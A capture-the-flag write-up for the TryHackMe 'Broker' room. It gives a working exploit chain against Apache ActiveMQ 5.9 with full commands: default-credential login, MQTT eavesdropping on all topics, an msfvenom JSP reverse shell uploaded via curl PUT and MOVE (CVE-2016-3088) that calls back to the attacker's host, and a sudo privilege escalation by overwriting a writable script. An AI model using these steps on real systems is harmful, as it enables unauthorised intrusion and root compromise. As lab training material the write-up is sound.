# Broker room - Try Hack Me

This writeup is for the Broker room at tryhackme.com. Direct link to the room is: (https://tryhackme.com/room/broker)

The description of the rooms says:
Paul and Max found a way to chat at work by using a certain kind of software. They think they outsmarted their boss, but do not seem to know that eavesdropping is quite possible...They better be careful...


As always I add the ip to my host file first:
```
 echo "10.10.51.43 broker.thm"|sudo tee -a /etc/hosts
```

## Enumeration

The usual nmap-scan to begin with (some ports redacted):
```
 nmap-scan  broker.thm  .
[#] Starting inital scan

nmap -p- -n -vv "10.10.51.43" -oA "./allPorts"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 04:21 EST
Initiating Ping Scan at 04:21
Scanning 10.10.51.43 [2 ports]
Completed Ping Scan at 04:21, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 04:21
Scanning 10.10.51.43 [65535 ports]
Discovered open port 22/tcp on 10.10.51.43
Discovered open port 41915/tcp on 10.10.51.43
Discovered open port 8161/tcp on 10.10.51.43
Discovered open port 1883/tcp on 10.10.51.43
Completed Connect Scan at 04:21, 16.93s elapsed (65535 total ports)
Nmap scan report for 10.10.51.43
Host is up, received conn-refused (0.035s latency).
Scanned at 2021-03-11 04:21:31 EST for 17s
Not shown: 65531 closed ports
Reason: 65531 conn-refused
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack
----/tcp  open  mqtt        syn-ack
----/tcp  open  patrol-snmp syn-ack
41915/tcp open  unknown     syn-ack
...

```
From this I get *the answer for question 1* - ports between 1000 and 9000. They are redacted in above. 

Three of the ports have been identified by nmap. 22 is the ssh port as usual. Then there is one port running MQTT (Message Queue Telemetry Transport) and finally a port that seems to run a webservice of some sort.

Lets check the port running the webservice as it usually reveal a few things. This is what I saw:

![alt text](https://github.com/kimusan/THM-writeups/raw/main/broker/broker_ss1.png "website login")

From this we get the *answer for question 2* in this room. Pressing the link "Manage ActiveMQ broker" reveals a basic auth login prompt. I could try hitting this with a hydra attack, but 
I just try a few of the most common user password combos manually.....Lo and behold! the simple combo admin:admin worked. After a bit of searching I found that this is the default for ActiveMQ. 
Browsing around the side you can find a lot of info about what the different "topics" (basically queues/rooms) in the broker are. This could come in handy - especially as one of them is called "secret chat".

I did run a gobuster scan against the webservice - just to see if something interesting was hidden there. Only thing it found as an API folder, which makes sense as this is part of the ActiveMQ system.
Lets move on to the next question: "Which videogame are Paul and Max talking about?" 

Since I found that there is an MQTT broker running on the server, then it is very likely that this is the mechanism that Max and Paul use to chat.  The hint says that the mqtt client called "mqtt Explorer" 
does not work, so I looked for an alternative. One of the most popular ones is the mosquitto client. I downloaded that and ran it against the server:

```
$ mosquitto_sub -h broker.thm -v -d -t '#'  -p 1883 -i broker
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT
Client broker sending CONNECT

```
It seems like something is wrong. I tried a few other clients as well but all had the same problem. 

I finally found this client : https://github.com/bapowell/python-mqtt-client-shell
When running it, I noticed something it wrote to the screen: protocol version. Could this be the problem? 
I tried changing it and SUCCESS! now it could connect and I got the secret chat messages.

```
$ python3 mqtt_client_shell.py  

Welcome to the MQTT client shell.
Type help or ? to list commands.
Pressing <Enter> on an empty line will repeat the last command.

Client args: client_id=paho-3394-kali, clean_session=True, protocol=4 (MQTTv3.1.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
> protocol 3
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
> connection

Connection args: host=localhost, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
> host 10.10.2.229

Connection args: host=10.10.2.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0

Connection args: host=10.10.2.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
> connect
                              on_log(): level=16 - Sending CONNECT (u0, p0, wr0, wq0, wf0, c1, k60) client_id=b'paho-3394-kali'

***CONNECTED***
Subscriptions: 
Connection args: host=10.10.2.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
>                               on_log(): level=16 - Received CONNACK (0, 0)
                              on_connect(): result code = 0 (Connection Accepted.)
                                            flags = {'session present': 0}
subscribe #
                              on_log(): level=16 - Sending SUBSCRIBE (d0, m1) [(b'#', 0)]
...msg_id=1, result=0 (No error.)

***CONNECTED***
Subscriptions: (topic=#,qos=0)
Connection args: host=10.10.2.229, port=1883, keepalive=60, bind_address=, will=None,
                 username=, password=, 
                 TLS/SSL args: ca_certs_filepath=None, ...  (TLS not used)
Client args: client_id=paho-3394-kali, clean_session=True, protocol=3 (MQTTv3.1), transport=tcp
Logging: on (indent=30), Recording: off, Pacing: 0
>                               on_log(): level=16 - Received SUBACK
                              on_subscribe(): subscribed: msg id = 1, granted_qos = (0,)
                              on_log(): level=16 - Received PUBLISH (d0, q0, r0, m0), 'ActiveMQ/Advisory/Consumer/Topic/>', ...  (0 bytes)
                              on_message(): message received: Topic: ActiveMQ/Advisory/Consumer/Topic/>, QoS: 0, Payload Length: 0
                                                              Payload (str): b''
                                                              Payload (hex): b''
...
```
Basically I send the following commands in above dump:

```
protocol 3 <-- sets the previous version of the protocol (default is 4)
connection <-- goes into connecion mode
host broker.thm <-- sets the broker address (default is localhost)
connect <-- well connect
subscribe # <--  subscribe to all topics (# is a wildcard in MQTT)
```
From here on you will start to receive the messages from the different topics. Some of these are chat messages and they mention a specific video game - *the answer for question 3*

### Getting foothold (shell)

Now it is time to get access to the server. Since we know the software running on the webservice and we know the version of it (revealed after logging into the system), this would be a good place to start.
```
$ searchsploit activemq
--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
ActiveMQ < 5.14.0 - Web Shell Upload (Metasploit)                                            | java/remote/42283.rb
Apache ActiveMQ 5.11.1/5.13.2 - Directory Traversal / Command Execution                      | windows/remote/40857.txt
Apache ActiveMQ 5.2/5.3 - Source Code Information Disclosure                                 | multiple/remote/33868.txt
Apache ActiveMQ 5.3 - 'admin/queueBrowse' Cross-Site Scripting                               | multiple/remote/33905.txt
Apache ActiveMQ 5.x-5.11.1 - Directory Traversal Shell Upload (Metasploit)                   | windows/remote/48181.rb
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
First two in the list + the last seem to match the version I found. Two of them are metasploit modules, so I fired upe mfsconsole to try them out.
Long story, short! none of them seemed to work as expected. 
Back to the drawingboard and I started to search google for ideas. After some time I found this article:
https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30

I decided to rebuild this using a jsp reverse shell generated via msfvenom:
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.11.25.15" LPORT=1234 -f raw > shell.jsp
```
With this I started the process using curl (I loove that command). 

First I uploaded the shell to the fileserver folder:
```
$ curl -u 'admin:admin' -v -X PUT --data "@shell.jsp" http://broker.thm:8161/fileserver/shell.jsp
*   Trying 10.10.2.229:8161...
* Connected to broker.thm (10.10.2.229) port 8161 (#0)
* Server auth using Basic with user 'admin'
> PUT /fileserver/shell.jsp HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Length: 1439
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 1439 out of 1439 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact

```
Next I need to figure out what the internal path is for the admin folder. This is needed as jsp is not executed in the fileserver folder.

```
$ curl -u 'admin:admin' -v -X PUT http://broker.thm:8161/fileserver/test/%20/%20      
*   Trying 10.10.2.229:8161...
* Connected to broker.thm (10.10.2.229) port 8161 (#0)
* Server auth using Basic with user 'admin'
> PUT /fileserver/test/%20/%20 HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 /opt/apache-activemq-5.9.0/webapps/fileserver/test/ /  (No such file or directory)
< Content-Length: 0
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact

```
Now we know that the path is /opt/apache-activemq-5.9.0/ and that the admin folder would be placed here. Lets move the file:

```
$ curl -u 'admin:admin' -v -X MOVE --header "Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp"  http://broker.thm:8161/fileserver/shell.jsp

*   Trying 10.10.2.229:8161...
* Connected to broker.thm (10.10.2.229) port 8161 (#0)
* Server auth using Basic with user 'admin'
> MOVE /fileserver/shell.jsp HTTP/1.1
> Host: broker.thm:8161
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.74.0
> Accept: */*
> Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Server: Jetty(7.6.9.v20130131)
< 
* Connection #0 to host broker.thm left intact
```
Now the shell is ready to be executed, but first I need a listener:
```
$ nc -nvlp 1234
```
let's turn on the shell (with curl of course):
```
$ curl -u 'admin:admin' -v http://broker.thm:8161/admin/shell.jsp
```
We have shell!. 
```
─$ nc -nvlp 1234            
listening on [any] 1234 ...
connect to [10.11.25.15] from (UNKNOWN) [10.10.2.229] 46012
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
groups
activemq
python3 -c 'import pty;pty.spawn("/bin/bash")'
activemq@activemq:/opt/apache-activemq-5.9.0$ export TERM=xterm
export TERM=xterm
activemq@activemq:/opt/apache-activemq-5.9.0$ ^Z
zsh: suspended  nc -nvlp 1234
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/broker]
└─$ stty raw -echo;fg                                                                                                                                                       148 ⨯ 1 ⚙
[1]  + continued  nc -nvlp 1234

activemq@activemq:/opt/apache-activemq-5.9.0$ ls
LICENSE  README.txt		 bin	  conf	flag.txt  start.sh	tmp
NOTICE	 activemq-all-5.9.0.jar  chat.py  data	lib	  subscribe.py	webapps
activemq@activemq:/opt/apache-activemq-5.9.0$ 

```
a simple cat flag.txt and *the answer for question 4* is found. 


# Privelege escalation
Next up is getting root. The first thing I usually do in these THM rooms is to check sudo
```
$ sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```
basically we are allowed to run some python script as root 
I checked the permissions on that script:
```
$ ls -lah /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- 1 activemq activemq 768 Dec 25 17:50 /opt/apache-activemq-5.9.0/subscribe.py
```
we both own and have access to the file - this makes it almost too easy:
```
activemq@activemq:/opt$ echo 'import os; os.system("/bin/bash")' > /opt/apache-activemq-5.9.0/subscribe.py
activemq@activemq:/opt$ sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
root@activemq:/opt# cat /root/root.txt 
THM{--RECACTED--}
```
And with this I got the *root flag and the final question 5* in this room.



## Afterthoughts
This room was marked at being a medium level room, but really the most difficult part was to realize that the protocol for MQTT was an older one.
If you expected the room to be exploitable via metasploit then it might be a bit difficult but the steps for getting the shell onto the server are pretty simple.
For a room like this, getting "root" was too easy in my opinion.

Still a fun room though!
QED
